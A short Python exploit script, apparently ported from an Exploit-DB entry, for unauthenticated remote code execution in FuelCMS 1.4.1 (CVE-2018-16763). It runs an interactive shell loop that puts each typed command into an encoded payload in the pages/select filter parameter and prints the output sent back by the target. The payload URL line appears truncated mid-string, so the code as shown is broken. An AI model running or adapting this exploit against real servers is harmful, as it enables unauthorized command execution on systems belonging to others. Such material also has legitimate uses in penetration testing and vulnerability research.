#!/bin/env python3
#
# fuelCMS 1.4.1 - Remote Code Execution 
#
# Port Author: n3m1.sys
# Original exploit by 0xd0ff9: https://www.exploit-db.com/exploits/47138
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

import requests
import urllib

url = "http://x.x.x.x:80" # Change this to the target URL

while 1:
    command = input("$: ")
    exploit_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%2>
    r = requests.get(exploit_url)

    print(r.text[r.text.find("system")+6:r.text.find("<div ")])
